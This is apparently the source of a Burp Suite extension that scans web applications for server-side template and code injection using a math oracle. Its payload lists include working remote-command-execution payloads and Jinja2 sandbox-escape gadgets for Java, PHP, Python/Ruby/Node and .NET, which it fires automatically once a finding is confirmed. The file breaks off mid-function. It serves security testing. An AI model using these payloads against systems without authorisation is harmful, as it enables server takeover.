# -*- coding: utf-8 -*-
#
# code_injection_sentinel.py
# ---------------------------------------------------------------------------
# Created by asad0x0
# ---------------------------------------------------------------------------
# Burp Suite Professional extension that passively monitors in-scope HTTP
# traffic (Proxy history) and actively tests one parameter at a time for
# SERVER-SIDE CODE INJECTION / template injection (SSTI) using a MATH ORACLE.
#
# Why a math oracle (and not reflection like the XSS tool):
#   Code injection = the payload is EXECUTED on the server, not bounced back.
#   So we inject an arithmetic expression built from two RANDOM operands
#   (e.g. 7193 * 3851) and look for the computed PRODUCT (27700143) in the
#   response body. A reflected-but-not-executed payload shows the expression
#   text, never the product -> the product is proof of execution.
#
# False-positive controls (primary design goal):
#   - random multi-digit operands  -> product won't coincidentally pre-exist
#   - product must NOT be in the baseline (original) response
#   - digit-boundary match          -> product isn't a substring of a bigger #
#   - .NET culture format handled   -> also matches "27,700,143"
#   - TWO-PAIR confirmation          -> a second request with new operands must
#                                       also compute correctly => CONFIRMED
#   - cookies are never scanned
#
# NO blind / timing detection by design (output-based only).
#
# Compatibility: Burp Suite Professional, Jython 2.7 (Python 2 syntax only).
#
# Platforms (toggle in UI):
#   Java-EL   : ${..} #{..} *{..} %{..} {{..}}  (EL / SpEL / OGNL / Freemarker /
#               Velocity / generic)
#   PHP       : eval breakouts + Twig/Smarty
#   PyRubyNode: Jinja2 {{..}}, ERB <%= %>, Ruby #{..}, Python/Node eval breakouts
#   .NET      : Razor @(..), Scriban {{..}}, Liquid times filter, NCalc/
#               DataTable.Compute bare expr, classic ASP <%= %>
#
# Architecture (one responsibility per class):
#   - Config            : runtime settings / global state
#   - PAYLOADS          : platform-tagged payload templates (__A__ / __B__)
#   - Utilities         : stateless helpers
#   - ParameterParser   : GET / POST / JSON / XML / multipart params
#   - RequestBuilder    : rebuild a request with ONE injected parameter
#   - DetectionEngine   : math-oracle product search (digit-boundary, .NET fmt)
#   - Logger            : timestamped log -> stdout + UI pane
#   - ResultRow / Model : Swing table backing the findings table
#   - ConfidenceRenderer: colours rows by confidence
#   - ExtensionUI       : the "Code Injection" suite tab
#   - Scanner           : worker pool, queue, rate limit, dedup, oracle flow
#   - BurpExtender      : entry point
# ---------------------------------------------------------------------------

import sys
import time
import json
import re
import threading
import Queue
import random
from datetime import datetime

# --- Burp API ---------------------------------------------------------------
from burp import IBurpExtender
from burp import IHttpListener
from burp import IExtensionStateListener
from burp import IContextMenuFactory
from burp import IScanIssue
from burp import IHttpRequestResponse
from burp import ITab
from burp import IParameter

# --- Java / Swing -----------------------------------------------------------
from java.io import PrintWriter, File
from java.awt import BorderLayout, GridLayout, FlowLayout, Font, Color
from java.awt import Toolkit
from java.awt.datatransfer import StringSelection
from java.awt.event import MouseAdapter, ActionListener
from java.util import ArrayList, Comparator
from java.net import URL as JURL
from jarray import array as jarray_array

from javax.swing import (JPanel, JScrollPane, JTable, JCheckBox, JTextField,
                         JLabel, JButton, JSplitPane, JTextArea, JPopupMenu,
                         JMenuItem, JFileChooser, SwingUtilities, BorderFactory,
                         ListSelectionModel, RowFilter)
from javax.swing.table import (AbstractTableModel, DefaultTableCellRenderer,
                               TableRowSorter)


# ===========================================================================
#  Config
# ===========================================================================
class Config(object):
    """All user-configurable options + shared runtime state."""

    def __init__(self):
        # master switch
        self.enabled = True

        # platforms to test (each enables its payload group)
        self.pf_java = True            # Java EL / SpEL / OGNL / Freemarker / Velocity
        self.pf_php = True             # PHP eval + Twig / Smarty
        self.pf_pyrubynode = True      # Jinja2 / ERB / Ruby / Python / Node
        self.pf_dotnet = True          # Razor / Scriban / Liquid / NCalc / ASP

        # parameter sources
        self.enable_get = True
        self.enable_post = True
        self.enable_json = True
        self.enable_multipart = True
        self.enable_xml = True

        # behaviour
        self.enable_logging = True     # log every probe to Output + UI pane
        self.log_misses = False        # if False, only hits are logged (quieter)
        self.highlight = True          # highlight confirmed items in proxy history
        self.require_confirm = True    # need 2nd pair to mark CONFIRMED (else SUSPECTED)

        # after a CONFIRMED PHP or Py/Ruby/Node finding, automatically fire a
        # command probe (`id`) to escalate eval -> RCE with real output proof.
        # ON by default: it only ever fires on an already-CONFIRMED hit (rare),
        # so it's the double-confirm step, not extra scan noise. Uncheck to off.
        self.enable_rce_confirm = True

        # context-breakout payloads (input landing inside an existing tag /
        # quoted string). Adds a few extra probes per param. Default ON.
        self.enable_breakout = True

        # also report findings into Burp's Target -> Issues (so Burp's own
        # report generator picks them up with CWE/severity). Default ON.
        self.enable_scan_issues = True

        # on a CONFIRMED Jinja SSTI where generic RCE gadgets fail (sandboxed
        # environment), enumerate which app/framework context objects are
        # present via `is defined` -> head-start for manual escalation through
        # an application object (e.g. Pydantic parse_raw). Default ON.
        self.enable_ctx_enum = True

        # optional custom template: must contain __A__ and __B__
        #   e.g.  <#assign x=__A__*__B__>${x}
        self.custom_payload = ""

        # unique low-collision token (reserved for future tagging)
        self.canary = "ciq" + "".join(
            random.choice("abcdefghijklmnopqrstuvwxyz0123456789")
            for _ in range(5))

        # performance
        self.max_threads = 5
        self.rate_limit_ms = 120       # min gap between outgoing requests

        # static resources to ignore
        self.ignore_extensions = [
            ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico",
            ".svg", ".woff", ".woff2", ".ttf", ".otf", ".mp4", ".mp3", ".zip",
            ".pdf", ".exe"
        ]

        # response MIME types we are willing to test
        self.testable_mimes = ["HTML", "JSON", "XML", "text", "script"]


# ===========================================================================
#  PAYLOADS : platform-tagged templates. __A__ / __B__ are replaced by the two
#  random operands. The expected marker is always str(A*B) (plus the .NET
#  comma-grouped form), so detection code never needs to know the template.
# ===========================================================================
COLOR_GREEN = Color(0, 140, 0)     # Confirmed
COLOR_YELLOW = Color(240, 210, 0)  # Suspected

# (id, label, platform, template)
PAYLOAD_DEFS = [
    # ---- Java family ------------------------------------------------------
    ("el_dollar",   "EL ${}",            "java",   "${__A__*__B__}"),
    ("el_hash",     "EL/SpEL #{}",       "java",   "#{__A__*__B__}"),
    ("spel_star",   "SpEL *{}",          "java",   "*{__A__*__B__}"),
    ("ognl_pct",    "OGNL %{}",          "java",   "%{__A__*__B__}"),
    ("velocity",    "Velocity #set",     "java",   "#set($zq=__A__*__B__)${zq}"),

    # ---- PHP --------------------------------------------------------------
    ("php_semi",    "PHP ;print;",       "php",    ";print(__A__*__B__);"),
    ("php_dq",      "PHP \"-print-\"",   "php",    "\"-print(__A__*__B__)-\""),
    ("php_sq",      "PHP '.print.'",     "php",    "'.print(__A__*__B__).'"),
    ("php_interp",  "PHP ${@print}",     "php",    "${@print(__A__*__B__)}"),
    ("smarty",      "Smarty {}",         "php",    "{__A__*__B__}"),

    # ---- Python / Ruby / Node --------------------------------------------
    ("jinja",       "Jinja2/Twig {{}}",  "pyrubynode", "{{__A__*__B__}}"),
    ("erb",         "ERB <%= %>",        "pyrubynode", "<%= __A__*__B__ %>"),
    ("ruby_interp", "Ruby #{}",          "pyrubynode", "#{__A__*__B__}"),
    ("py_sq",       "Py '+str()+'",      "pyrubynode", "'+str(__A__*__B__)+'"),
    ("py_dq",       "Py \"+str()+\"",    "pyrubynode", "\"+str(__A__*__B__)+\""),
    ("node_sq",     "Node '+()+'",       "pyrubynode", "'+(__A__*__B__)+'"),
    ("node_tmpl",   "Node/JS ${}",       "pyrubynode", "${__A__*__B__}"),

    # ---- .NET -------------------------------------------------------------
    ("razor",       "Razor @()",         "dotnet", "@(__A__*__B__)"),
    ("razor_attr",  "Razor \"@()\"",     "dotnet", "\"@(__A__*__B__)\""),
    ("scriban",     "Scriban {{}}",      "dotnet", "{{__A__*__B__}}"),
    ("liquid_times","Liquid times",      "dotnet", "{{ __A__ | times: __B__ }}"),
    ("ncalc_bare",  "NCalc/Compute bare","dotnet", "__A__*__B__"),
    ("aspx",        "ASP.NET <%= %>",    "dotnet", "<%= __A__*__B__ %>"),
]


def _tpl_build(template, a, b):
    return template.replace("__A__", str(a)).replace("__B__", str(b))


# Context-breakout payloads: for when the injected value lands INSIDE an
# existing template tag ({{ }}) or a quoted string/attribute, so a plain
# drop-in won't fire. These close the surrounding context first, then inject.
BREAKOUT_DEFS = [
    # break out of an attribute/string then open a fresh Jinja2/Twig tag
    ("bo_jinja_tag", "Breakout }}{{}}",   "pyrubynode", "}}{{__A__*__B__}}"),
    ("bo_jinja_dq",  "Breakout \"}}{{}}", "pyrubynode", "\"}}{{__A__*__B__}}"),
    ("bo_jinja_sq",  "Breakout '}}{{}}",  "pyrubynode", "'}}{{__A__*__B__}}"),
    # same for Scriban/Liquid/Razor-ish {{ }} on .NET
    ("bo_net_tag",   "Breakout }}{{}} net", "dotnet",   "}}{{__A__*__B__}}"),
    ("bo_net_dq",    "Breakout \"}}{{}} net", "dotnet", "\"}}{{__A__*__B__}}"),
    # break out of a quoted string into a Java EL expression
    ("bo_el_dq",     "Breakout \"${}",    "java",      "\"${__A__*__B__}"),
    ("bo_el_sq",     "Breakout '${}",     "java",      "'${__A__*__B__}"),
    # break out of a quoted string then start a new PHP statement
    ("bo_php_dq",    "Breakout \";print", "php",       "\";print(__A__*__B__);//"),
]


def build_probes(config):
    """Return enabled probe descriptors, deduped by template string."""
    wanted = set()
    if config.pf_java:        wanted.add("java")
    if config.pf_php:         wanted.add("php")
    if config.pf_pyrubynode:  wanted.add("pyrubynode")
    if config.pf_dotnet:      wanted.add("dotnet")

    defs = list(PAYLOAD_DEFS)
    if config.enable_breakout:
        defs += BREAKOUT_DEFS

    probes, seen_tpl = [], set()
    for pid, label, pf, tpl in defs:
        if pf not in wanted:
            continue
        if tpl in seen_tpl:
            continue
        seen_tpl.add(tpl)
        probes.append({"id": pid, "label": label, "platform": pf,
                       "template": tpl})

    custom = config.custom_payload.strip()
    if custom and "__A__" in custom and "__B__" in custom:
        probes.append({"id": "custom", "label": "custom",
                       "platform": "custom", "template": custom})
    return probes


# ---------------------------------------------------------------------------
# PHP command-exec confirmation payloads. Fired ONLY on a CONFIRMED PHP finding
# when enable_rce_confirm is on. Proof = `id` output (uid=.. gid=..) in the
# response body, which an arithmetic oracle alone can't demonstrate. Mirrors the
# PHP math breakouts so the same context that executed A*B also runs `id`.
# The last one captures output into an Exception message, for sinks where the
# command runs but nothing is echoed yet display_errors leaks the error text.
# ---------------------------------------------------------------------------
RCE_PHP_PAYLOADS = [
    ";echo `id`;",
    "';echo `id`;'",
    "\";echo `id`;\"",
    "${@print(`id`)}",
    (";ob_start();echo `id`;$o=ob_get_contents();"
     "ob_end_clean();throw new Exception($o);//"),
]

# Python / Ruby / Node command-exec confirmation payloads. The pyrubynode
# platform groups these engines, so on a CONFIRMED pyrubynode finding we fire a
# small set covering all three (string-concat breakouts + Jinja2 SSTI RCE);
# whichever engine it really is, one lands and `id` output proves RCE.
RCE_PYRUBYNODE_PAYLOADS = [
    "'+__import__('os').popen('id').read()+'",
    "\"+__import__('os').popen('id').read()+\"",
    ("{{self.__init__.__globals__.__builtins__"
     ".__import__('os').popen('id').read()}}"),
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    # Jinja2 sandbox-escape fallback gadgets (when self/cycler unavailable)
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{url_for.__globals__['os'].popen('id').read()}}",
    "{{get_flashed_messages.__globals__['os'].popen('id').read()}}",
    ("{{request.application.__globals__.__builtins__"
     ".__import__('os').popen('id').read()}}"),
    "#{`id`}",
    "<%= `id` %>",
    "'+require('child_process').execSync('id')+'",
    "${require('child_process').execSync('id')}",
]

# Java command-exec (output-returning) payloads. Java SSTI targets are almost
# always Linux, so `id` + uid/gid matching applies. Freemarker Execute returns
# the command output directly; the SpEL/OGNL readers use commons-io (common on
# Java web stacks) to read the process stream back into the response.
RCE_JAVA_PAYLOADS = [
    '${"freemarker.template.utility.Execute"?new()("id")}',
    ('#{T(org.apache.commons.io.IOUtils).toString('
     'T(java.lang.Runtime).getRuntime().exec("id").getInputStream(),"UTF-8")}'),
    ('%{(#a=@java.lang.Runtime@getRuntime().exec("id").getInputStream()).'
     '(#b=@org.apache.commons.io.IOUtils@toString(#a,"UTF-8"))}'),
]

# .NET payloads. .NET often runs on Windows (where `id` does not exist), so we
# run `cmd /c ver` -> "Microsoft Windows [Version ...]" (very distinctive). We
# also try `/bin/sh -c id` for .NET Core on Linux. Both read StandardOutput
# back inline via Razor @() and classic ASP <%= %>.
_NET_WIN = ('System.Diagnostics.Process.Start(new System.Diagnostics.'
            'ProcessStartInfo("cmd.exe","/c ver"){RedirectStandardOutput=true,'
            'UseShellExecute=false}).StandardOutput.ReadToEnd()')
_NET_NIX = ('System.Diagnostics.Process.Start(new System.Diagnostics.'
            'ProcessStartInfo("/bin/sh","-c id"){RedirectStandardOutput=true,'
            'UseShellExecute=false}).StandardOutput.ReadToEnd()')
RCE_DOTNET_PAYLOADS = [
    "@(" + _NET_WIN + ")",
    "<%=" + _NET_WIN + "%>",
    "@(" + _NET_NIX + ")",
    "<%=" + _NET_NIX + "%>",
]

RCE_PAYLOADS_BY_PLATFORM = {
    "php": RCE_PHP_PAYLOADS,
    "pyrubynode": RCE_PYRUBYNODE_PAYLOADS,
    "java": RCE_JAVA_PAYLOADS,
    "dotnet": RCE_DOTNET_PAYLOADS,
}

# proof regexes (two-anchor / distinctive -> low FP)
RCE_UID_RE = re.compile(r'uid=\d+\([^)\n]{1,64}\)\s*gid=\d+\(')   # Linux id
RCE_WIN_RE = re.compile(r'Microsoft Windows \[Version', re.I)         # cmd ver
RCE_OUTPUT_RE = RCE_UID_RE                                            # back-compat

# which proof regexes to accept per platform
RCE_REGEX_BY_PLATFORM = {
    "php": [RCE_UID_RE],
    "pyrubynode": [RCE_UID_RE],
    "java": [RCE_UID_RE],
    "dotnet": [RCE_UID_RE, RCE_WIN_RE],
}

# Context objects to enumerate on a sandboxed Jinja SSTI (via `is defined`).
# App/framework globals that commonly carry an escalation sink (ORM session,
# Pydantic model, config/creds). Jinja built-ins are excluded (always present).
CTX_ENUM_NAMES = [
    "user", "request", "g", "config", "settings", "session",
    "current_app", "csrf_token", "app", "params", "current_user",
]
# each object is wrapped as CIEN_<name>_{{ <name> is defined }}_
CTX_ENUM_RE = re.compile(r'CIEN_(\w+)_(True|False)_')


# ---------------------------------------------------------------------------
# CWE classification per probe. Template-engine payloads -> SSTI (CWE-1336);
# raw eval/expression breakouts -> Eval Injection (CWE-95); anything else ->
# generic Code Injection (CWE-94). An RCE escalation adds CWE-78 (OS command).
# ---------------------------------------------------------------------------
CWE_SSTI    = "CWE-1336 (SSTI)"
CWE_EVAL    = "CWE-95 (Eval Injection)"
CWE_GENERIC = "CWE-94 (Code Injection)"
CWE_OS      = "CWE-78 (OS Command)"

CWE_BY_PROBE_ID = {
    # template engines -> SSTI
    "el_dollar": CWE_SSTI, "el_hash": CWE_SSTI, "spel_star": CWE_SSTI,
    "ognl_pct": CWE_SSTI, "velocity": CWE_SSTI, "smarty": CWE_SSTI,
    "jinja": CWE_SSTI, "erb": CWE_SSTI,
    "razor": CWE_SSTI, "razor_attr": CWE_SSTI, "scriban": CWE_SSTI,
    "liquid_times": CWE_SSTI, "aspx": CWE_SSTI,
    # raw eval / expression breakouts -> Eval Injection
    "php_semi": CWE_EVAL, "php_dq": CWE_EVAL, "php_sq": CWE_EVAL,
    "php_interp": CWE_EVAL, "ruby_interp": CWE_EVAL,
    "py_sq": CWE_EVAL, "py_dq": CWE_EVAL, "node_sq": CWE_EVAL,
    "node_tmpl": CWE_EVAL, "ncalc_bare": CWE_EVAL,
    # breakout variants
    "bo_jinja_tag": CWE_SSTI, "bo_jinja_dq": CWE_SSTI, "bo_jinja_sq": CWE_SSTI,
    "bo_net_tag": CWE_SSTI, "bo_net_dq": CWE_SSTI,
    "bo_el_dq": CWE_SSTI, "bo_el_sq": CWE_SSTI,
    "bo_php_dq": CWE_EVAL,
}


def cwe_for(probe):
    return CWE_BY_PROBE_ID.get(probe.get("id"), CWE_GENERIC)


# ---------------------------------------------------------------------------
# CVSS scoring. Every finding here is SERVER-SIDE code execution (the product
# is computed on the server), i.e. RCE-class impact -> Critical. JS-context /
# XSS downgrade from the CWE-94 write-up does not apply: this tool only fires
# on server-side evaluation. CONFIRMED (2-pair) is scored outright; SUSPECTED
# (1-pair) carries the same vector but is flagged for manual verification.
# ---------------------------------------------------------------------------
CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"


def score_for(confidence):
    if confidence == "CONFIRMED":
        return ("Critical 9.8", CVSS_VECTOR)
    return ("Critical 9.8 (verify)", CVSS_VECTOR)


# ===========================================================================
#  Utilities
# ===========================================================================
class Utilities(object):

    def __init__(self, helpers):
        self._helpers = helpers

    def now(self):
        return datetime.now().strftime("%H:%M:%S")

    def get_body_str(self, request, req_info):
        offset = req_info.getBodyOffset()
        return self._helpers.bytesToString(request)[offset:]

    def header_value(self, req_info, name):
        name = name.lower()
        for line in req_info.getHeaders():
            if ":" in line:
                k, v = line.split(":", 1)
                if k.strip().lower() == name:
                    return v.strip()
        return ""

    def boundary_from_ctype(self, ctype):
        m = re.search(r'boundary=("?)([^";]+)\1', ctype)
        return m.group(2) if m else None

    def has_ignored_extension(self, url, ignore_list):
        try:
            path = url.getPath().lower()
        except Exception:
            return False
        for ext in ignore_list:
            if path.endswith(ext):
                return True
        return False

    def copy_to_clipboard(self, text):
        try:
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                StringSelection(text), None)
        except Exception:
            pass

    def response_content_type(self, response):
        try:
            info = self._helpers.analyzeResponse(response)
            for h in info.getHeaders():
                if h.lower().startswith("content-type:"):
                    return h.split(":", 1)[1].strip()
            return info.getStatedMimeType() or ""
        except Exception:
            return ""


# ===========================================================================
#  ParameterParser : discover injectable parameters (cookies excluded)
# ===========================================================================
class ParameterParser(object):

    def __init__(self, helpers, utils, config):
        self._helpers = helpers
        self._utils = utils
        self._cfg = config

    def parse(self, request, req_info, method):
        descriptors = []

        for p in req_info.getParameters():
            ptype = p.getType()
            name = p.getName()
            if not name:
                continue
            # NOTE: PARAM_COOKIE intentionally skipped -> cookies never scanned
            if ptype == IParameter.PARAM_URL and self._cfg.enable_get:
                descriptors.append({"kind": "url", "name": name,
                                    "burp_type": IParameter.PARAM_URL})
            elif (ptype == IParameter.PARAM_BODY and method == "POST"
                  and self._cfg.enable_post):
                descriptors.append({"kind": "body", "name": name,
                                    "burp_type": IParameter.PARAM_BODY})

        if method == "POST":
            ctype = self._utils.header_value(req_info, "content-type").lower()
            body = self._utils.get_body_str(request, req_info)
            if "application/json" in ctype and self._cfg.enable_json:
                descriptors.extend(self._parse_json(body))
            elif "xml" in ctype and self._cfg.enable_xml:
                descriptors.extend(self._parse_xml(body))
            elif "multipart/form-data" in ctype and self._cfg.enable_multipart:
                descriptors.extend(self._parse_multipart(ctype, body))

        return descriptors

    # ---- JSON ----------------------------------------------------------
    def _parse_json(self, body):
        out = []
        try:
            obj = json.loads(body)
        except Exception:
            return out
        for path, _v in self._json_string_leaves(obj, []):
            out.append({"kind": "json", "name": self._path_name(path),
                        "path": path})
        return out

    def _json_string_leaves(self, obj, path):
        results = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                results.extend(self._json_string_leaves(v, path + [k]))
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                results.extend(self._json_string_leaves(v, path + [i]))
        elif isinstance(obj, basestring):
            results.append((path, obj))
        return results

    def _path_name(self, path):
        return ".".join([str(p) for p in path])

    # ---- XML -----------------------------------------------------------
    XML_LEAF = re.compile(r'<([A-Za-z_][\w\.\-:]*)[^>]*>([^<>]*)</\1>')

    def _parse_xml(self, body):
        out = []
        for i, m in enumerate(self.XML_LEAF.finditer(body)):
            out.append({"kind": "xml", "name": m.group(1), "occ": i})
        return out

    # ---- multipart -----------------------------------------------------
    def _parse_multipart(self, ctype, body):
        out = []
        boundary = self._utils.boundary_from_ctype(ctype)
        if not boundary:
            return out
        try:
            for part in body.split("--" + boundary):
                head = part.split("\r\n\r\n", 1)[0]
                if "filename=" in head:
                    continue
                m = re.search(r'name="([^"]+)"', head)
                if m:
                    out.append({"kind": "multipart", "name": m.group(1),
                                "boundary": boundary})
        except Exception:
            pass
        return out


# ===========================================================================
#  RequestBuilder : inject payload into exactly ONE parameter
# ===========================================================================
class RequestBuilder(object):

    XML_LEAF = re.compile(r'(<([A-Za-z_][\w\.\-:]*)[^>]*>)([^<>]*)(</\2>)')

    def __init__(self, helpers, utils, config):
        self._helpers = helpers
        self._utils = utils
        self._cfg = config

    def build(self, request, desc, value):
        kind = desc["kind"]

        # URL / urlencoded body -> Burp's own parameter machinery (URL-encoded)
        if kind in ("url", "body"):
            encoded = self._helpers.urlEncode(value)
            param = self._helpers.buildParameter(desc["name"], encoded,
                                                 desc["burp_type"])
            return self._helpers.updateParameter(request, param)

        # structured bodies -> rebuild body, let Burp fix Content-Length
        req_info = self._helpers.analyzeRequest(request)
        headers = req_info.getHeaders()
        body = self._utils.get_body_str(request, req_info)

        if kind == "json":
            new_body = self._inject_json(body, desc["path"], value)
        elif kind == "xml":
            new_body = self._inject_xml(body, desc["occ"], value)
        elif kind == "multipart":
            new_body = self._inject_multipart(body, desc["boundary"],
                                              desc["name"], value)
        else:
            return None

        if new_body is None:
            return None
        return self._helpers.buildHttpMessage(
            headers, self._helpers.stringToBytes(new_body))

    def _inject_json(self, body, path, payload):
        try:
            obj = json.loads(body)
            cur = obj
            for key in path[:-1]:
                cur = cur[key]
            cur[path[-1]] = payload
            return json.dumps(obj)
        except Exception:
            return None

    def _inject_xml(self, body, occ, payload):
        counter = [0]

        def repl(m):
            idx = counter[0]
            counter[0] += 1
            if idx == occ:
                return m.group(1) + payload + m.group(4)
            return m.group(0)
        try:
            return self.XML_LEAF.sub(repl, body)
        except Exception:
            return None

    def _inject_multipart(self, body, boundary, target, payload):
        try:
            delim = "--" + boundary
            rebuilt = []
            for part in body.split(delim):
                hb = part.split("\r\n\r\n", 1)
                m = re.search(r'name="([^"]+)"', hb[0])
                if (m and m.group(1) == target and len(hb) == 2
                        and "filename=" not in hb[0]):
                    rebuilt.append(hb[0] + "\r\n\r\n" + payload + "\r\n")
                else:
                    rebuilt.append(part)
            return delim.join(rebuilt)
        except Exception:
            return None


# ===========================================================================
#  DetectionEngine : math-oracle product search
# ===========================================================================
class DetectionEngine(object):

    def __init__(self, helpers, config):
        self._helpers = helpers
        self._cfg = config

    def new_operands(self):
        """Two random 4-digit operands (product is 7-8 digits, low collision)."""
        return random.randint(1000, 9999), random.randint(1000, 9999)

    def fresh_operands(self, baseline, dotnet, avoid=None, tries=6):
        """Return (a, b, product, needles) whose product is NOT already in the
        baseline (and != avoid). Regenerates instead of giving up, so a rare
        baseline collision does not make us skip a real finding. None if every
        attempt collided."""
        for _ in range(tries):
            a, b = self.new_operands()
            product = a * b
            if avoid is not None and product == avoid:
                continue
            needles = self.needles(product, dotnet)
            if not self.found(baseline, needles):
                return (a, b, product, needles)
        return None

    def needles(self, product, dotnet):
        """Marker strings to search for. .NET may culture-format with commas."""
        out = [str(product)]
        if dotnet:
            grouped = "{:,}".format(product)
            if grouped != str(product):
                out.append(grouped)
        return out

    def body_str(self, response):
        if response is None:
            return ""
        offset = self._helpers.analyzeResponse(response).getBodyOffset()
        return self._helpers.bytesToString(response)[offset:]

    def status_length(self, response):
        if response is None:
            return 0, 0
        info = self._helpers.analyzeResponse(response)
        return info.getStatusCode(), len(response) - info.getBodyOffset()

    def found(self, body, needles):
        """
        True if any needle appears at a DIGIT boundary (so the product is not a
        coincidental substring of a longer number). Commas inside a grouped
        needle are part of the needle, boundaries are checked on the outside.
        """
        if not body:
            return False
        for needle in needles:
            idx = 0
            n = len(needle)
            while True:
                i = body.find(needle, idx)
                if i == -1:
                    break
                before = body[i - 1] if i > 0 else ""
                after = body[i + n] if i + n < len(body) else ""
                if not before.isdigit() and not after.isdigit():
                    return True
                idx = i + 1
        return False


# ===========================================================================
#  Logger
# ===========================================================================
class Logger(object):

    def __init__(self, stdout_writer, config):
        self._out = stdout_writer
        self._cfg = config
        self._ui = None

    def attach_ui(self, ui):
        self._ui = ui

    def _emit(self, text):
        try:
            self._out.println(text)
        except Exception:
            pass
        if self._ui is not None:
            self._ui.append_log(text)

    def log_probe(self, ts, method, url, where, probe, status, length, hit):
        if not self._cfg.enable_logging:
            return
        if not hit and not self._cfg.log_misses:
            return
        self._emit("[%s] %s %s | Where: %s | Probe: %s | Exec: %s "
                   "| Status: %s | Length: %s" % (
                       ts, method, url, where, probe,
                       "YES" if hit else "no", status, length))

    def info(self, text):
        self._emit("[*] " + text)

    def error(self, where, exc_info=None):
        self._emit("[!] Error in %s: %s" % (
            where, exc_info[1] if exc_info else "?"))


# ===========================================================================
#  ResultRow / ResultsTableModel / ConfidenceRenderer
# ===========================================================================
class ResultRow(object):

    def __init__(self, time_s, method, url, where, engine, confidence,
                 status, length, request, response, host, port, https,
                 payload="", evidence="", cwe="", severity="", cvss=""):
        self.time = time_s
        self.method = method
        self.url = url
        self.where = where
        self.engine = engine            # which payload/engine fired
        self.payload = payload          # the exact injected string (PoC)
        self.confidence = confidence    # "CONFIRMED" / "SUSPECTED"
        self.evidence = evidence        # what proved it (product / cmd output)
        self.cwe = cwe                  # CWE classification
        self.severity = severity        # e.g. "Critical 9.8"
        self.cvss = cvss                # full CVSS v3.1 vector
        self.status = status
        self.length = length
        self.request = request          # PoC request bytes
        self.response = response
        self.host = host
        self.port = port
        self.https = https
        self.model_index = None

    def color_val(self):
        return COLOR_GREEN if self.confidence == "CONFIRMED" else COLOR_YELLOW


class ResultsTableModel(AbstractTableModel):

    COLUMNS = ["Time", "Method", "URL", "Where", "Engine", "Payload",
               "Confidence", "Evidence", "CWE", "Severity", "Status", "Length"]

    def __init__(self):
        self._rows = []

    def getRowCount(self):
        return len(self._rows)

    def getColumnCount(self):
        return len(self.COLUMNS)

    def getColumnName(self, col):
        return self.COLUMNS[col]

    def getValueAt(self, row, col):
        r = self._rows[row]
        return [r.time, r.method, r.url, r.where, r.engine, r.payload,
                r.confidence, r.evidence, r.cwe, r.severity,
                str(r.status), str(r.length)][col]

    def isCellEditable(self, row, col):
        return False

    def add_row(self, result_row):
        self._rows.append(result_row)
        idx = len(self._rows) - 1
        result_row.model_index = idx
        self.fireTableRowsInserted(idx, idx)

    def update_row(self, result_row):
        if result_row.model_index is not None:
            i = result_row.model_index
            if 0 <= i < len(self._rows):
                self.fireTableRowsUpdated(i, i)

    def get_row(self, idx):
        return self._rows[idx]

    def clear(self):
        self._rows = []
        self.fireTableDataChanged()

    def all_rows(self):
        return list(self._rows)


class ConfidenceRenderer(DefaultTableCellRenderer):

    def __init__(self, model):
        self._model = model

    def getTableCellRendererComponent(self, table, value, is_selected,
                                      has_focus, row, column):
        comp = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, is_selected, has_focus, row, column)
        try:
            r = self._model.get_row(table.convertRowIndexToModel(row))
            if r is not None:
                c = r.color_val()
                comp.setBackground(c)
                comp.setForeground(Color.BLACK if c == COLOR_YELLOW
                                   else Color.WHITE)
        except Exception:
            pass
        return comp


# ===========================================================================
#  ExtensionUI
# ===========================================================================
class ExtensionUI(ITab):

    def __init__(self, callbacks, config, logger):
        self._callbacks = callbacks
        self._cfg = config
        self._logger = logger
        self._scanner = None          # wired in by BurpExtender after build
        self.model = ResultsTableModel()
        self._repeater_counter = 0
        self._count_monitored = 0
        self._count_confirmed = 0
        self._count_suspected = 0
        self._build()

    def set_scanner(self, scanner):
        self._scanner = scanner

    def getTabCaption(self):
        return "Code Injection"

    def getUiComponent(self):
        return self._root

    def _build(self):
        self._root = JPanel(BorderLayout())
        settings = self._build_settings()

        self.table, scroll, self.sorter = self._make_table(self.model)

        self.log_area = JTextArea()
        self.log_area.setEditable(False)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        log_scroll = JScrollPane(self.log_area)

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT, scroll, log_scroll)
        split.setResizeWeight(0.72)

        self._root.add(settings, BorderLayout.NORTH)
        self._root.add(split, BorderLayout.CENTER)
        self._root.add(self._build_statusbar(), BorderLayout.SOUTH)

    def _make_table(self, model):
        table = JTable(model)
        table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        table.getColumnModel().getColumn(2).setPreferredWidth(300)  # URL
        table.getColumnModel().getColumn(3).setPreferredWidth(120)  # Where
        table.getColumnModel().getColumn(4).setPreferredWidth(150)  # Engine
        table.getColumnModel().getColumn(5).setPreferredWidth(240)  # Payload
        table.getColumnModel().getColumn(7).setPreferredWidth(200)  # Evidence
        table.getColumnModel().getColumn(8).setPreferredWidth(150)  # CWE
        table.getColumnModel().getColumn(9).setPreferredWidth(130)  # Severity
        renderer = ConfidenceRenderer(model)
        for i in range(model.getColumnCount()):
            table.getColumnModel().getColumn(i).setCellRenderer(renderer)
        sorter = TableRowSorter(model)
        sorter.setComparator(10, self._IntComparator())   # Status
        sorter.setComparator(11, self._IntComparator())   # Length
        table.setRowSorter(sorter)
        table.addMouseListener(self._TableMouse(self, table, model))
        return table, JScrollPane(table), sorter

    class _IntComparator(Comparator):
        def compare(self, a, b):
            try:
                return cmp(int(a), int(b))
            except Exception:
                return 0

    def _build_statusbar(self):
        bar = JPanel(BorderLayout())
        self.stats_label = JLabel(
            " Monitored: 0   Confirmed: 0   Suspected: 0 ")
        legend = JLabel("Legend:  GREEN = CONFIRMED (2-pair)    "
                        "YELLOW = SUSPECTED (1 pair)        ")
        author = JLabel("Code Injection Sentinel  -  created by asad0x0   ")
        author.setFont(Font("SansSerif", Font.BOLD, 12))
